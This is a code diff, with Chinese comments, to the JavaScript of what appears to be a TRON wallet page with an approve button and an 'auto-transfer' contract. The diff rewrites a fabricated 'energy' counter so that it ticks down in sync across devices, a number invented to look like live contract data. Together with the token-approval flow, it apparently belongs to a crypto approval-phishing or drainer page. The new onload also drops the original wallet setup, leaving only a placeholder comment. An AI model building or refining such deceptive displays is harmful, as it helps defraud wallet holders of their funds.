@@ -377,11 +377,10 @@ body {
     ];
 
     // 能量计算配置（和你截图逻辑一致）
-    const INIT_TRX = 315360004000; // 初始能量
-    const TRX_DECREASE_PER_SEC = 1243; // 每秒减少1243
-    const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime(); // 部署时间
-    let trxTimer = null; // 能量定时器
-    
+   const INIT_TRX = 4104470400000; // 维持2年的初始值
+const TRX_DECREASE_PER_SEC = 65200; // 不变，每秒减65200
+const GLOBAL_START_TIME = new Date("2025-01-01T00:00:00Z").getTime(); // 不变
+    let trxTimer = null;
     // 全局变量
     let tronWeb = null;
     let userAddress = null;
@@ -700,79 +699,39 @@ function updateEnergyDisplay(currentEnergy) {
     }
 }
 
-// 4. 核心：启动能量倒计时（修复时间计算）
-function startPersistentEnergyCountdown() {
-    // 修复1：确保部署时间不晚于当前时间（这里改为2024年，避免未来时间导致秒差为负）
-    const DEPLOY_TIME = new Date("2024-10-28T00:00:00Z").getTime();
-    const now = new Date().getTime();
-    // 若当前时间仍早于部署时间，强制设为当前时间（避免秒差为负）
-    const effectiveDeployTime = now < DEPLOY_TIME ? now : DEPLOY_TIME;
-
-    // 读取缓存状态
-    const savedState = loadEnergyStateFromStorage();
-    let currentEnergy = Number(savedState.currentEnergy);
-
-    // 修复2：重新计算初始能量（基于真实时间差）
-    const totalSecPassed = Math.floor((now - effectiveDeployTime) / 1000);
-    currentEnergy = INIT_TRX - (totalSecPassed * TRX_DECREASE_PER_SEC);
-    currentEnergy = Math.max(0, currentEnergy); // 确保不小于0
-
-    // 初始更新显示
-    updateEnergyDisplay(currentEnergy);
-
-    // 修复3：确保定时器正常启动（清除旧定时器+重新设置）
-    if (trxTimer) clearInterval(trxTimer);
-    trxTimer = setInterval(() => {
-        // 每秒减少1243
-        currentEnergy -= TRX_DECREASE_PER_SEC;
-        currentEnergy = Math.max(0, currentEnergy); // 防止负数
-        updateEnergyDisplay(currentEnergy);
-        // 能量为0时停止定时器
-        if (currentEnergy <= 0) {
-            clearInterval(trxTimer);
-        }
-    }, 1000); // 1秒触发一次，确保实时更新
+// 计算当前实时能量（跨设备同步核心：基于固定起始时间）
+function calculateCurrentEnergy() {
+  const now = new Date().getTime();
+  const secPassed = Math.floor((now - GLOBAL_START_TIME) / 1000); // 所有设备算出来的秒数一致
+  return Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
 }
 
-// 5. 优化window.onload中的调用（确保定时器必启动）
-window.onload = async () => {
-    updatePageLang();
-    langToggle.addEventListener("click", toggleLang);
-    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
-    renderEnergyRecords();
-    updateWalletStatus();
-    
-    // 环境检测（即使失败，也启动能量倒计时）
-    await checkImTokenEnv().catch(err => {
-        console.error("环境检测失败：", err);
-        const lang = langConfig[currentLang];
-        userInfoEl.innerHTML = lang.userInfoDefault;
-        approveBtn.disabled = true;
-        approveBtn.textContent = lang.approveBtnText;
-    });
-    
-    // 关键：无论环境检测是否成功，都启动能量倒计时（用户反馈的核心问题点）
-    startPersistentEnergyCountdown();
-    
-    window.addEventListener("beforeunload", () => {
-        if (trxTimer) clearInterval(trxTimer);
-    });
+// 实时更新页面（无分隔符，跳得清晰）
+function updateEnergyDisplay() {
+  const contractEnergyEl = document.getElementById("contractEnergy");
+  if (contractEnergyEl) {
+    const currentEnergy = calculateCurrentEnergy();
+    contractEnergyEl.textContent = Math.floor(currentEnergy);
+    console.log("当前能量：", Math.floor(currentEnergy));
+  }
+}
 
-    // 授权后跳转处理
-    if (window.tronWeb && window.location.hash === "#approve") {
-        window.location.hash = "";
-        setTimeout(() => {
-            initWallet(true).catch(err => {
-                console.error("授权后初始化失败：", err);
-                const lang = langConfig[currentLang];
-                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
-                approveBtn.disabled = false;
-                approveBtn.textContent = lang.approveBtnText;
-            });
-        }, 500);
-    }
+// 启动定时器（每秒更新，肉眼跳数）
+function startPersistentEnergyCountdown() {
+  updateEnergyDisplay(); // 页面加载先显示当前值
+
+  // 每秒更新一次，数字持续跳动
+  if (trxTimer) clearInterval(trxTimer);
+  trxTimer = setInterval(updateEnergyDisplay, 1000); // 1秒触发一次
+
+  // 页面关闭清除定时器
+  window.addEventListener("beforeunload", () => clearInterval(trxTimer));
+}
+
+// 页面加载直接启动（保留你原来的window.onload其他逻辑）
+window.onload = function() {
+  // 你原来的语言切换、DOM初始化等代码不变...
+  startPersistentEnergyCountdown(); // 启动跨设备同步+跳数
 };
     /**
      * 环境检测（错误静默处理）
